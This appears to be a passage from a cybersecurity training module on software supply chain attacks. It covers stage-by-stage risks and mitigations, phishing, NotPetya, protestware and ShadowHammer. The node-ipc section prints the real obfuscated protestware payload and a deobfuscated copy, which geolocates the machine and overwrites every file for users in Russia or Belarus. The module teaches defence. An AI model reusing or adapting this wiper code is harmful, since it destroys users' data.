What amplifies the consequences is the scale at which these libraries and dependencies are often used. A compromised library could affect multiple projects or entire ecosystems, creating a ripple effect of vulnerabilities and exploits. Remediation becomes particularly tricky, requiring updates to each affected dependency and potentially even a code restructuring in the worst-case scenarios.

### Mitigation Strategies

- `Dependency Scanning`: Regularly scan dependencies for known vulnerabilities using tools like [Snyk](https://snyk.io/advisor/) or [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/).
- `Software Bill of Materials (SBOM)`: Maintain a comprehensive list of all libraries, dependencies, and their versions and sources.
- `Manual Auditing`: Periodically review third-party components, particularly when incorporating them into critical parts of the system.

## Version Control Systems

`Version Control Systems` ( `VCS`) like `Git`, `Mercurial`, or `SVN ` are indispensable in modern software development, serving as the nerve centre for code management and collaboration. However, their centrality also makes them attractive targets for attackers.

Vulnerabilities in this stage often arise from `misconfigurations`, such as poorly set access controls or the use of insecure communication protocols. Additionally, historical commits could contain sensitive information, like hard-coded passwords or API keys, which could be exploited if not adequately purged.

Another avenue of vulnerability is the human element. Developers might bypass best practices in the haste of collaboration or pressure from deadlines. This could manifest as pushing sensitive information to public repositories or failing to adequately review pull requests, thereby allowing potentially malicious changes to seep into the codebase.

### Types of Attacks

- `Repository Poisoning`: Injecting malicious code into the repository, `contaminating ` the entire codebase.
- `Commited Secrets`: VCS doesn’t easily forget. Previously `committed secrets` may still exist in the `commit history`.
- `Access Control Bypass`: Exploiting `weak permissions` to gain unauthorised access to the repository.
- `Clone-and-Own Attacks`: Attackers clone a repository, modify it maliciously, and trick developers into using the tainted version.

### Consequences

The impact of a compromised Version Control System can be both far-reaching and enduring. Given that `VCS` is the repository for all historical code, an attacker could insert vulnerabilities that persist across multiple software versions. This makes detection and remediation exceedingly difficult, extending the lifespan of the attack's effectiveness.

Furthermore, compromised version control can lead to `complete code integrity loss`, undermining trust in the development process and the end product.

### Mitigation Strategies

- `Strong Access Controls`: Implement `role-based access controls`, and restrict who can push to master branches.
- `Commit Signing`: Use `cryptographic signatures` to verify the integrity of commits.
- `Regular Auditing`: Review `activity logs` to monitor for suspicious changes or access patterns.
- `Secure Communication`: Always use protocols like HTTPS or SSH to transfer data to and from the VCS.

## Build and Integration

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Software-Supply-Chains_03_B_BI.png)

The `Build and Integration` stage, encapsulating `Continuous Integration` ( `CI`) and `Continuous Delivery` ( `CD`), acts as the crucible where code from various contributors is melded into a cohesive whole. `CI/CD` tools like `Jenkins`, `Travis CI`, and `CircleCI` are instrumental in this process. However, the automated nature of these systems can introduce vulnerabilities. For instance, build scripts may be susceptible to injection attacks, or the `CI/CD` environments might be poorly secured, allowing unauthorised access.

Moreover, these systems often require permissions to access various parts of the software stack, from source code repositories to deployment environments. If improperly configured, these permissions can become a golden ticket for attackers, granting them extensive reach into the software infrastructure.

### Types of Attacks

- `Pipeline Poisoning`: Injecting malicious code into the CI/CD pipeline to compromise the build process or the resulting software.
- `Configuration Tampering`: Modifying the configuration files of CI/CD tools to maliciously alter the build process.
- `Secrets Leakage`: Exploiting insecure storage or transfer of sensitive information like `API keys` or credentials within the CI/CD process.
- `Environment Hijacking`: Gaining control over the CI/CD environment to carry out attacks ranging from data exfiltration to resource exploitation.

### Consequences

A compromised Build and Integration stage can lead to adverse outcomes. Malicious alterations to the build process can produce `compromised software versions` that include `hidden payloads` or `vulnerabilities`. These flawed builds could be `automatically deployed`, affecting potentially thousands or millions of end-users within a very short time frame.

The automated and interconnected nature of CI/CD systems amplifies the scale and speed of potential attacks. Once the trust in these automated processes is undermined, it can lead to a reticence to adopt DevOps practices, which could slow down development cycles and hamper agility.

### Mitigation Strategies

- `Pipeline as Code`: Define the build pipeline using code stored in a version-controlled repository, allowing easier auditing and rollback.
- `Secure Secrets Management`: Use specialised tools or services for `securely storing` and managing sensitive information required in the CI/CD process.
- `Immutable Infrastructure`: Treat your CI/CD infrastructure as immutable to prevent configuration drift and ensure a consistent, secure environment.
- `Automated Security Checks`: Integrate security scanning tools into the CI/CD process to automatically check for vulnerabilities in the code and the built software.

## Testing

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Software-Supply-Chains_03_B_T.png)

The `Testing` stage serves as a quality control checkpoint, assessing software through unit, integration, and user acceptance tests. While the focus is often on functional correctness, security considerations can sometimes be relegated to the background. Test environments may be hastily configured and might not mirror the security controls in production settings, thus exposing vulnerabilities.

Additionally, test data might inadvertently include sensitive or `personally identifiable information` ( `PII`), and poor access controls can expose this data to unauthorised individuals. Even the testing tools, if not properly vetted or configured, can introduce vulnerabilities, such as insecure data transmission or storage.

### Types of Attacks

- `Data Exfiltration`: Attackers may exploit weak security in test environments to steal sensitive test data.
- `Test Manipulation`: Malicious actors could tamper with test scripts or results to hide vulnerabilities or flaws in the software.
- `Credential Sniffing`: Poorly encrypted or stored credentials used in testing could be intercepted and used for unauthorised access.

### Consequences

A compromised Testing stage can have far-reaching implications. Manipulated or inaccurate test results can lead to the release of software replete with unaddressed vulnerabilities, directly impacting end-users. The leakage of sensitive test data can result in compliance violations and provide attackers with a treasure trove of information to facilitate further attacks.

Moreover, the erosion of trust in the testing process can cripple the development workflow. Doubts about the reliability of test results may necessitate additional rounds of testing and validation, delaying release cycles and incurring financial costs.

### Mitigation Strategies

- `Isolated Test Environments`: Use segregated, controlled environments with security controls that mimic the production setting.
- `Data Anonymisation`: Ensure that any sensitive or PII data used in testing is anonymised or masked to prevent unauthorised access.
- `Automated Security Scanning`: Integrate automated security tests into the testing process to catch vulnerabilities before software release.
- `Role-Based Access Control (RBAC)`: Limit access to test environments and data based on the principle of least privilege.

## Deployment

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Software-Supply-Chains_03_B_DE.png)

The `Deployment ` stage represents the culmination of the software development process, as the thoroughly vetted and tested code is finally moved to production environments. This could be on physical servers, cloud-based platforms, or complex distributed systems. Ironically, this pivotal stage is fraught with potential security pitfalls.

For instance, misconfigured servers or cloud resources can expose the application to unauthorised access. Inadequate monitoring can also make detecting or responding to real-time security incidents difficult.

Moreover, in a bid to streamline the deployment process, automation scripts and tools are frequently employed. These scripts often require elevated permissions to interact with various production environment components. If compromised, they can give an attacker substantial control over the deployed application and underlying infrastructure.

### Types of Attacks

- `Server Exploitation`: Vulnerable servers can be compromised to `manipulate the deployed software` or exfiltrate data.
- `Resource Manipulation`: Attackers could alter cloud configurations to weaken security controls or incur financial costs.
- `Zero-Day Exploits`: Sophisticated attackers might deploy previously unknown vulnerabilities in the production environment.

### Consequences

Unauthorised or malicious deployments can have immediate and severe impacts, including data breaches, system outages, and unauthorised access to sensitive systems. The direct financial costs can be steep, especially considering potential regulatory fines for data breaches.

The long-term consequences are equally concerning. Recovery often requires not just patching the specific vulnerability but also a painstaking audit of the entire environment to ensure no other compromises have occurred, significantly prolonging the time to resolution.

### Mitigation Strategies

- `Immutable Deployments`: Use immutable infrastructure to ensure that production environments are consistent and secure.
- `Automated Security Checks`: Implement automated checks to validate the security configurations of servers and cloud resources as part of the deployment process.
- `Least Privilege Principle`: Limit the permissions required by deployment scripts and tools to the minimum necessary. Avoid giving scripts `root` by any means.
- `Monitoring and Alerting`: Employ real-time monitoring and alerting mechanisms to quickly identify and respond to unauthorised changes or suspicious activities.

## Distribution

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Software-Supply-Chains_03_B_DI.png)

The final frontier in the software supply chain, the Distribution stage, is where the rubber meets the road, as software is disseminated to end-users. Whether through direct downloads, software repositories like `npm ` or `PyPI`, or consumer-focused app stores like `Google Play` and the `Apple App Store`, each channel presents its unique vulnerabilities.

Direct downloads could be compromised if the server hosting the software is insecure, potentially leading to the distribution of tampered files. Software repositories are often targeted for "supply chain attacks," where attackers upload malicious packages disguised as legitimate libraries.

While generally more secure, App stores are not impervious to issues like fake applications or apps that exploit platform vulnerabilities to bypass security checks.

### Types of Attacks

- `Tampering`: Modifying software binaries during the distribution process to include malicious code.
- `Impersonation`: Creating `fake versions` of popular software or apps to deceive users into downloading them.
- `Dependency Confusion`: Uploading `malicious packages` to repositories with names similar to private packages used by specific companies, tricking their automated systems into using them.

### Consequences

An attack at the Distribution stage can have immediate and widespread consequences. Malicious software can be directly delivered to unsuspecting end-users, leading to various issues ranging from data breaches to ransomware attacks. The scale of the impact is directly proportional to the popularity of the compromised software, making successful attacks at this stage particularly devastating.

Moreover, the reputational damage for the software producer can be crippling. Users may lose faith in the distribution channels and, by extension, in the integrity of the software itself. This loss of trust can lead to reduced user adoption, negative reviews, and a decline in market share.

### Mitigation Strategies

- `Digital Signatures`: Use `digital signatures` to verify the authenticity of software packages before they are distributed.
- `User Education`: Provide clear guidelines to end-users on how to safely download and install software, including verifying digital signatures and downloading from trusted sources.


# Common Attack Vectors in Software Supply Chain Attacks

* * *

## Phishing and Social Engineering

In the complex landscape of cybersecurity threats, some of the most effective attacks leverage the oldest and most predictable vulnerability: `human psychology`.

Phishing and social engineering attacks `exploit human behaviours`, such as trust, fear, or curiosity, to deceive individuals into performing actions or divulging confidential information. These methods are incredibly potent in supply chains, where a single compromised individual can have cascading impacts across multiple entities.

### The Art of Deception

At their core, phishing and social engineering attacks rely on the art of deception. They manipulate individuals into breaking standard security practices:

1. `Phishing`: This is a form of attack where `cybercriminals impersonate legitimate entities`, often through email, to deceive individuals into providing sensitive data, like passwords or credit card numbers. Phishing emails might contain malicious attachments or links, leading to fake websites that harvest user information.
2. `Spear Phishing`: A more targeted form of phishing, spear phishing involves highly customised messages `aimed at a specific individual or organisation`. The content is tailored based on the victim's specific details, making the deception harder to spot.
3. `Vishing (Voice Phishing)`: Here, attackers use phone calls, pretending to be from legitimate organisations, to extract sensitive information from victims. It is a real risk as we enter an era of generative AI.
4. `Pretexting`: This involves creating a fabricated scenario (or pretext) to obtain information from a victim. For example, an attacker might pose as an IT support person and ask an employee for their login details to "fix" a non-existent issue.

### Consequences and Impact

The ramifications of successful phishing or social engineering attacks can be dire:

1. `Unauthorised Access`: Gaining login credentials can give attackers `access to sensitive systems or data`.
2. `Financial Loss`: If attackers `obtain banking or credit card details`, they can perform fraudulent transactions.
3. `Data Breaches`: Personal or proprietary data can be stolen and potentially sold on the black market or used for `identity theft`.
4. `Malware Installation`: Phishing emails can contain malicious attachments that, when opened, install `malware` on the victim's system, leading to further compromise.

### The 2016 DNC Email Leak

In 2016, the `Democratic National Committee` ( `DNC`) in the `United States` experienced a significant `security breach`. Attackers accessed the `DNC`'s computer network and stole a wealth of information, including emails, documents, and sensitive data. These materials were subsequently leaked online, leading to significant political repercussions.

The entry point for this breach was a `spear phishing` email sent to `John Podesta`, the chairman of `Hillary Clinton`'s 2016 presidential campaign. The email, disguised as a `security notification` from `Google`, directed `Podesta` to change his password through a malicious link. Once he did, the attackers had the credentials they needed to access his emails, and from there, they further infiltrated the `DNC` network.

The fallout from the leak was substantial. The contents of the emails became a significant topic of discussion in the media, with various controversies and narratives emerging from the exposed communications. Beyond the political implications, the breach highlighted the vulnerability of even high-profile organisations to relatively simple `phishing` tactics.

### Mitigations

Defending against phishing and social engineering requires both technological solutions and human-centric strategies:

1. `Education and Training`: Regularly train employees to recognise and report phishing attempts. Simulated phishing exercises can be particularly effective.
2. `Multi-factor Authentication (MFA)`: Even if credentials are compromised, MFA can prevent unauthorised access.
3. `Email Filtering`: Implement advanced email filtering solutions to detect and quarantine phishing emails.
4. `Regular Backups`: Ensure data is regularly backed up so data can be restored during a ransomware attack via phishing.
5. `Clear Policies`: Establish organisational policies about information sharing and ensure employees can verify unexpected requests for sensitive information.

## Compromised Software Updates

`Software updates` are a routine aspect of modern computing. They serve as a means to introduce new features, fix bugs, and, most importantly, patch `security vulnerabilities`. As such, users are typically encouraged to keep their software up-to-date.

However, this very mechanism, designed for enhancing security and functionality, can be weaponised by attackers to introduce `malware` into unsuspecting systems.

### Mechanism of Attack

Attackers, through various means, gain unauthorised access to the software development or distribution infrastructure. Once inside, they modify the legitimate update packages to include malicious code.

Depending on the attacker's intent, this code can range from `spyware` and `ransomware` to `trojans` and `worms`. When users or organisations download and apply these tainted updates, they inadvertently introduce the `malware` into their systems.

The potency of this `attack vector` lies in the inherent trust users place in software updates. Updates are often digitally signed, and the updating mechanism is seen as a trusted source. If attackers compromise this trust, they can bypass many traditional `security measures`.

### Impact and Consequences

The scope and impact of a `compromised software update` can be vast:

1. `Widespread Distribution`: A popular software product might have millions of users worldwide. A single compromised update can thus impact a vast audience almost instantaneously.
2. `Stealth`: Users trust software updates. `Malware` delivered this way might operate long before detection, especially if it's designed to be covert.
3. `Data Breaches`: `Malware` can exfiltrate sensitive user data, leading to `data breaches`. This can have legal and financial ramifications for businesses.
4. `Infrastructure Disruption`: In the case of critical infrastructure or business systems, malicious updates can disrupt operations, leading to financial losses and even potential safety concerns.

### NotPetya

The `NotPetya` `cyberattack` in June 2017 is a prime case study in `supply chain attacks`, showcasing the vulnerability of `software update mechanisms`. The attack commenced with a breach of the `M.E.Doc` software, which is extensively utilised for tax preparation in `Ukraine`. By compromising `M.E.Doc's` update server, attackers distributed a malicious update to unsuspecting users. This method of infiltration through a trusted channel is notably insidious and effective.

Initially, `NotPetya` was misidentified as `ransomware`, akin to the infamous `Petya` malware. However, a deeper analysis revealed a more sinister purpose. Unlike typical ransomware aimed at financial gain, `NotPetya` was primarily designed for disruption and destruction. The malware encrypted the master boot record, rendering the system inoperable. This characteristic deviated from standard ransomware, which generally leaves systems operational to facilitate ransom payment.

The rapid spread of `NotPetya` had extensive implications. While initially targeting `Ukrainian` entities, it swiftly proliferated globally, affecting multinational corporations, ports, factories, and law firms. The damages were astronomical, estimated in billions of dollars, positioning it as one of the most costly `cyberattacks` in history. Companies like `Maersk`, `Merck`, and `FedEx` reported significant disruptions and financial losses due to the attack.

The attack exploited multiple vulnerabilities and employed advanced techniques to propagate within networks. It utilised the `EternalBlue` exploit, previously leveraged by the `WannaCry` ransomware, to spread across networks. Additionally, `NotPetya` used legitimate administrative tools like `PsExec` and `WMIC` for lateral movement.

### Mitigations

Protecting against compromised software updates requires a multi-faceted approach:

1. `Multi-factor Authentication (MFA)`: Software vendors should use MFA for any system access, ensuring that even if credentials are compromised, attackers can't easily infiltrate.
2. `Regular Audits`: Regular security audits of the software update infrastructure can help detect vulnerabilities or anomalies.
3. `Segmentation`: By segmenting networks, organisations can ensure the malware does not spread easily, even if one device is compromised.


# Protestware in Dependency Attacks

* * *

`Protestware` is a subset of `Dependency Attacks`, wherein a developer deliberately alters `software applications`, `code libraries`, or `application packages` to convey a message about a contentious or important issue.

This alteration manifests in a variety of ways, ranging from the benign to the malignant. When the software runs, benign forms of `protestware` might include displaying a message or image about the issue. In contrast, malignant forms could involve more disruptive actions, such as restricting access to software functionalities or erasing user data.

What sets `protestware` apart from similar phenomena like `hacktivism` is the legitimacy of the actor involved.

In the case of `protestware`, the developer making the changes is often the original author or someone with authorised access to the `codebase`. This individual utilises their privileged access to inject protest messages or actions directly into the software, in contrast to exploiting vulnerabilities for unauthorised changes, as seen in `hacktivism`.

Thus, `protestware` serves as both a political or social expression tool and a potential security concern, particularly in `open-source ecosystems` where code changes can have far-reaching implications.

Firstly, the concentration of power in the hands of a few developers, or even a single developer, who have commit access to a repository, is a significant issue. This centralised authority enables them to unilaterally insert `protestware` into the `codebase`, bypassing the checks and balances typically associated with more distributed governance models.

Moreover, the modular nature of `open-source projects` exacerbates the issue. Larger projects often rely on smaller ones, meaning a single act of `protestware` can propagate throughout the software supply chain, causing a ripple effect of vulnerabilities.

The lack of rigorous `code review` or `security audits` in many smaller `open-source projects` further intensifies this susceptibility.

### Types of Attacks

1. `Code Repository Manipulation`: Altering file names, contents, or issues within a code repository to display protest messages.
2. `Command-line Interface Logs`: Injecting protest messages into the logs displayed during code installation.
3. `External Environment Code Execution`: Activating code based on the geographic location of a user, possibly redirecting them to specific websites.
4. `Destructive Code Execution`: Inserting code designed to erase or damage data, often triggered when the software runs in a specific geographic location.
5. `Developer Sanctions`: Preventing code from being distributed or executed in particular environments or locations.

### Consequences

The consequences of `protestware` attacks can be extensive. Technically, introducing unexpected code can undermine an application's or system's functionality and integrity. Such alterations can lead to system crashes, data loss, or unauthorised data access, posing significant risks to end-users.

The `domino effect` on the `software supply chain` intensifies these risks, as the compromised code affects multiple layers of interconnected applications.

The ethical and reputational repercussions are equally significant.

Introducing `protestware` politicises code, potentially alienating users and contributors with divergent views. It also erodes trust in the `open-source community`, an ecosystem built upon principles of collaboration and transparency. Stakeholders may question open-source projects' reliability and neutrality, prompting them to consider more controlled, `closed-source` alternatives.

These consequences can hinder the growth and diversity of the `open-source community`.

## Node-IPC

The `node-ipc` package is a recent example of malignant protestware, intentionally laced with malicious code by its original developer in response to geopolitical events. This package is crucial for facilitating inter-process communication in Node.js applications and is a dependency in many projects, with an estimated `450000 weekly downloads` according to [npm](https://www.npmjs.com/package/node-ipc).

The malicious version of the package included code to geolocate the machine where it's being run. If the package detects it's running in `Russia or Belarus`, it will attempt to overwrite the contents of every file on the system with a Unicode heart character (" `❤`").

In its later versions, it drops a file with a peace message on the desktop. Below is the obfuscated malicious code that the developer added to the `ssl-geospec.js` file.

```javascript
import u from"path";import a from"fs";import o from"https";setTimeout(function(){const t=Math.round(Math.random()*4);if(t>1){return}const n=Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=","base64");o.get(n.toString("utf8"),function(t){t.on("data",function(t){const n=Buffer.from("Li8=","base64");const o=Buffer.from("Li4v","base64");const r=Buffer.from("Li4vLi4v","base64");const f=Buffer.from("Lw==","base64");const c=Buffer.from("Y291bnRyeV9uYW1l","base64");const e=Buffer.from("cnVzc2lh","base64");const i=Buffer.from("YmVsYXJ1cw==","base64");try{const s=JSON.parse(t.toString("utf8"));const u=s[c.toString("utf8")].toLowerCase();const a=u.includes(e.toString("utf8"))||u.includes(i.toString("utf8"));if(a){h(n.toString("utf8"));h(o.toString("utf8"));h(r.toString("utf8"));h(f.toString("utf8"))}}catch(t){}})})},Math.ceil(Math.random()*1e3));async function h(n="",o=""){if(!a.existsSync(n)){return}let r=[];try{r=a.readdirSync(n)}catch(t){}const f=[];const c=Buffer.from("4p2k77iP","base64");for(var e=0;e<r.length;e++){const i=u.join(n,r[e]);let t=null;try{t=a.lstatSync(i)}catch(t){continue}if(t.isDirectory()){const s=h(i,o);s.length>0?f.push(...s):null}else if(i.indexOf(o)>=0){try{a.writeFile(i,c.toString("utf8"),function(){})}catch(t){}}}return f};const ssl=true;export {ssl as default,ssl}

```

[Deobfuscated](https://www.lunasec.io/docs/blog/node-ipc-protestware/), the code looks like this:

```javascript
import p from "path";
import fs from "fs";
import https from "https";

setTimeout(function () {
    if (Math.round(Math.random() * 4) > 1) {
        return;
    }

    const geoLocation = "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154";

    https.get(geoLocation, function (response) {
        response.on("data", function (jsonData) {
            try {
                const jsonObject = JSON.parse(jsonData);
                const countryName = jsonObject["country_name"].toLowerCase();
                if (countryName.includes("russia") || countryName.includes("belarus")) {
                    getFiles("./");
                    getFiles("../");
                    getFiles("../../");
                    getFiles("/");
                }
            } catch (response) {
            }
        });
    });
}, Math.ceil(Math.random() * 1000));

async function getFiles(path = "", param2 = "") {
    if (!fs.existsSync(path)) {
        return;
    }

    let fileInDir = [];
    try {
        fileInDir = fs.readdirSync(path);
    } catch (t) {
    }

    const toDelete = [];
    for (var i = 0; i < fileInDir.length; i++) {
        const combinedPath = p.join(path, fileInDir[i]);

        let pathData = null;
        try {
            pathData = fs.lstatSync(combinedPath);
        } catch (t) {
            continue;
        }

        if (pathData.isDirectory()) {
            const result = getFiles(combinedPath, param2);
            result.length > 0 ? toDelete.push(...result) : null;
        } else if (combinedPath.indexOf(param2) >= 0) {
            try {
                fs.writeFile(combinedPath, "❤️", function () {
                });
            } catch (t) {
            }
        }
    }
    return toDelete;
}

const ssl = true;
export {ssl as default, ssl};

```

### Geo-Location

```javascript
const geoLocation = "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154";
https.get(geoLocation, function (response) { ... });

```

The code initiates an HTTPS request to an IP geolocation service. It uses an API key to fetch the geographic information of the user's IP address. The intent is to identify the user's country of origin.

### Geo-Targeting

```javascript
const countryName = jsonObject["country_name"].toLowerCase();
if (countryName.includes("russia") || countryName.includes("belarus")) {
   getFiles("./");
   getFiles("../");
   getFiles("../../");
   getFiles("/");
}

```

The software targets users based in Russia and Belarus explicitly. If the country name matches these criteria, it executes the `getFiles` function to manipulate files.

### File Manipulation

```javascript
async function getFiles(path = "", param2 = "")
{
// ...
        if (pathData.isDirectory()) {
            const result = getFiles(combinedPath, param2);
            result.length > 0 ? toDelete.push(...result) : null;
        } else if (combinedPath.indexOf(param2) >= 0) {
            try {
                fs.writeFile(combinedPath, "❤️", function () {
                });
            } catch (t) {
            }
        }
// ...
}

```

The `getFiles` function reads files from the specified directories and overwrites their content with a heart emoji ("❤️").

### Impact

Introducing `malicious code` into the `node-ipc` package had ramifications extending far beyond the package itself. Given its role in facilitating `inter-process communication` in `Node.js`, `node-ipc` is a dependency for numerous projects.

One such project significantly impacted was `Vue.js`. `Vue.js` is a prominent `JavaScript` framework used for building user interfaces. Its reliance on `node-ipc` meant that the insertion of `protestware` into the latter had immediate and disruptive effects on the `Vue.js` ecosystem.

This situation was particularly perilous as developers using `Vue.js` could unknowingly incorporate the `malicious code` into their projects simply by updating their dependencies. The potential for widespread disruption was considerable, considering the extensive use of `Vue.js` in various web applications—these range from small personal projects to large-scale enterprise solutions. Therefore, any application with `node-ipc` in its dependency tree risked becoming a conduit for this politically-motivated malware. This situation highlighted significant security vulnerabilities and ethical dilemmas in `open-source software`.

This incident with `node-ipc` underscores the complexities and risks associated with `dependency management` in software development. While the motivations behind the `protestware` may have been driven by social or political objectives, its far-reaching impacts illustrate the profound and often unintended consequences that can arise in the interconnected world of software dependencies.

### Version Pinning Mitigation

One of the most effective strategies for shielding a project from the disruptive effects of `protestware` or other `malicious dependency attacks` is `version pinning`.

`Version pinning` involves explicitly specifying which version of a package your project should use. Rather than permitting automatic updates to the latest version, a pinned version remains fixed until manually updated. In `Node.js` and its package manager, `npm`, this is often accomplished by setting exact version numbers in the `package.json` file.

For example, to pin `node-ipc` to a known secure version, one might use the following syntax in `package.json`:

```json
"dependencies": {
  "node-ipc": "9.2.1"
}

```

Or, for more complex scenarios involving transitive dependencies, one could employ `overrides`:

```json
"overrides": {
  "node-ipc@>9.2.1 <10": "9.2.1",
  "node-ipc@>10.1.0": "10.1.0"
}

```

By pinning the `node-ipc` version, developers ensure their projects only utilise a version known to be free from `protestware` or other `malicious code`. Even if newer versions are compromised, as with versions 9.2.2, 10.1.1, and 10.1.2 of `node-ipc`, a pinned version would remain unaffected, consequently, any projects or downstream dependencies relying on `node-ipc` would also be shielded from the harmful code.

It's important to note that while `version pinning` is an effective preventive measure, it has its trade-offs. By not updating to the latest versions, developers might miss out on new features, performance enhancements, and security patches. Therefore, `version pinning` should form part of a broader strategy that includes regular `security audits` and `code reviews` to determine when it's safe and advantageous to update to newer versions.


# ShadowHammer

* * *

The `ShadowHammer` cyber-attack, uncovered in late January 2019, represents a sophisticated `supply chain attack`. Targeting the `ASUS Live Update Utility`, the assault involved malware-laden executable files downloaded from an official domain, with the intriguing twist of retaining a valid `digital signature`.

Named “ [Operation ShadowHammer](https://securelist.com/operation-shadowhammer/89992/)" by `Kaspersky Lab` researchers, the operation aimed to target an undefined user pool selectively discerned through their network adapters' `MAC addresses`.

## The Incident

Researchers at `Kaspersky Lab` initially stumbled upon the operation while investigating an ostensibly unrelated case concerning a large Asian manufacturer. What initially appeared as routine anomalies in executable files escalated into the discovery of a highly sophisticated cyber offensive.

The infected files, downloaded from the official domain of a reputable manufacturer, contained stealthy malware features. Unlike conventional cyber-attacks, where tampering with executable files breaks the `digital signature`, the compromised files, in this case, retained their `digital signatures`, making them appear legitimate.

The most conspicuous victim of this attack was `ASUS`, a prominent manufacturer of computer hardware and consumer electronics. Specifically, the `ASUS Live Update Utility`—a tool designed to keep ASUS systems up to date—was compromised.

This impacted numerous ASUS computer systems, putting an unknown number of users at risk. However, the target pool was a select group of users identified through their network adapters' `MAC addresses`. Therefore, while the scale of the infection was grand, the focus of the exploit was surgical.

### Chronology of Events

- Late January 2019: `Kaspersky Lab` researchers discovered the `ShadowHammer` attack targeting the `ASUS Live Update Utility`.
- 31 January 2019: `Kaspersky Lab` researchers notified `ASUS` about the attack and provided a preliminary report.
- 1 February 2019: `ASUS` provided `Kaspersky Lab` with the latest version of the `ASUS Live Update Utility` for analysis, which was uninfected.
- 14 February 2019: `Kaspersky Lab` researchers had a face-to-face meeting with `ASUS` to discuss the details of the attack.
- 20 February 2019: `Kaspersky Lab` researchers updated `ASUS` with newly found details about the attack.
- 8 March 2019: `Kaspersky Lab` provided `ASUS` with a list of targeted `MAC addresses` and answered further questions about the attack.
- 26 March 2019: `ASUS` released a patched version of the ASUS Live Update Utility to fix the security vulnerability in the ShadowHammer attack.
- 8 April 2019: `Kaspersky Lab` provided a comprehensive report on the current attack investigation to `ASUS`.

### Initial Entry Points

The initial entry points in the `ShadowHammer` incident revealed a series of intricacies that speak to the sophistication of the attackers. `Digital signatures`, a cornerstone of modern cybersecurity, were manipulated to camouflage the malicious code,

The backdoored `ASUS binaries` were uniquely signed with two different certificates, identified by the fingerprints `0ff067d801f7daeeae842e9fe5f610ea` and `05e6a0be5ac359c7ff11f4b467ab20fc`. These certificates had previously been used to sign thousands of legitimate ASUS files, making it exceedingly difficult to revoke them without causing widespread disruption.

Both abused certificates originated from `DigiCert SHA2 Assured ID Code Signing CA`. In contrast, legitimate `ASUS binaries` typically use a certificate issued by `DigiCert EV Code Signing CA (SHA2)`, which has more stringent requirements. This suggests that the attackers might not have had access to ASUS's production signing device with an EV certificate.

Even after `Kaspersky Lab` reported the compromised certificates to ASUS, new software was observed being signed with one of these flawed certificates, indicating an inadequate response.

As early as June 2018, Reddit threads indicated suspicious `ASUS Live Update` messages, suggesting that compromised updates might have been delivered much earlier than initially suspected.

The compromise of the certificate implies one of two scenarios: either the attackers obtained a copy of the certificates, or they exploited a system within the ASUS network where these certificates were installed. Either way, it signifies a severe breach of security protocols.

### The Payload

Once on a system, the `malware` would check the `MAC address` of the network adapter against a hardcoded list of `MAC addresses` within its code. This list essentially served as the hit list of the attackers. The `malware` would execute its malicious payload if the system's `MAC address` was on the list. This specificity in target selection made `ShadowHammer` both peculiar and alarming; it's a tactic rarely seen in most cyber-attacks. The exact details of what the payload would do upon finding a match are less clear.

The `ShadowHammer attack` demonstrated algorithmic similarities with other known `malware`, such as `PlugX`. The decryption algorithm used was eerily parallel, pointing towards the possibility that the attackers had experience with `PlugX` source code.

One remarkable method employed involved replacing the `WinMain` function in the affected `ASUS Live Update Utility`. The `WinMain` function is the primary entry point for a Windows-based application, and by hijacking it, the attackers ensured that their malicious code would be executed as soon as the software was launched.

The `malware` code was intricately woven into the legitimate `ASUS` utility, essentially Trojanizing it. This means the malicious code was not merely appended or prepended to the existing software but integrated into its very fabric, making it difficult to detect without in-depth analysis.

The code would then invoke the `IPHLPAPI.dll` library to access the `GetAdaptersAddresses` function, which is used to retrieve the `MAC address` of the network adapter on the host system. This information was checked against a hardcoded list of targeted `MAC addresses`.

If a match were found, the `malware` would download additional payloads from the `command and control server` or execute further malicious operations, thereby compromising the system in a highly targeted manner.

### Vulnerability and Impact

One of the most notable points of the attack was the attackers' ability to sign `malicious files` with legitimate `ASUS` digital certificates. Generally, the presence of a valid certificate assures the file's integrity and origin, often bypassing even rigorous `security checks`. The fact that the attackers could `sign the malicious ASUS Live Updater files` with authentic `ASUS` digital certificates highlights two primary vulnerabilities:

1. `Stolen Certificates`: The attackers could have `stolen the digital certificates from ASUS`, raising questions about the security measures guarding these vital assets.
2. `Subverted Signing Process`: The attackers might have `compromised the code-signing process within ASUS`. This would indicate an even deeper level of intrusion, possibly `involving insider cooperation` or severe operational lapses.

The `ASUS Live Updater files` were distributed via official `ASUS` update servers, which should be highly secure assets. The ability of attackers to insert `malicious files` into this trusted distribution channel indicates a significant `security failure`. Potential vulnerabilities include:

1. `Insufficient Server Hardening`: The update servers may not have been adequately fortified against intrusion, making them an easier target for attackers.
2. `Inadequate Monitoring`: A lack of robust real-time monitoring could have `delayed detecting malicious activity`, allowing the attackers to operate unimpeded.
3. `Misconfigured Access Controls`: If more people than necessary had access to these critical servers, the attack surface would increase, offering more opportunities for compromise either through external hacking or internal malfeasance.

After being alerted to the compromised certificate, `ASUS` continued to sign newly released software with it for a month. This reflects a possible lackadaisical `incident response` mechanism, indicating the following issues:

1. `Delayed Response`: The time taken to revoke the compromised certificates was inordinately long, extending the window of vulnerability.
2. `Insufficient Verification`: There seemed to be no immediate, thorough internal audit to verify the security of other certificates and sensitive assets.

## Mitigations

Prompt actions like `certificate revocation` and `server quarantine` are indispensable in the immediate aftermath of a `security incident` like the `ShadowHammer attack`. These measures would have effectively hindered the `malware's` credibility and distribution mechanism.

Simultaneously, an emergency `patch` ought to be issued to `end-users` to remove the compromised software and restore its legitimate version. Temporarily suspending updates could also be prudent until the `system's integrity` is reaffirmed, thereby preventing additional infections.

Looking forward, a multifaceted approach to `security` would be most effective. Enhanced measures for `certificate usage`, such as `multi-factor authentication`, could add layers of complexity for would-be attackers, making it far more challenging to misuse `certificates`.

`Endpoint Detection and Response (EDR)` tools, particularly those operating in real-time, could serve as vigilant sentinels against abnormal activities on critical servers.

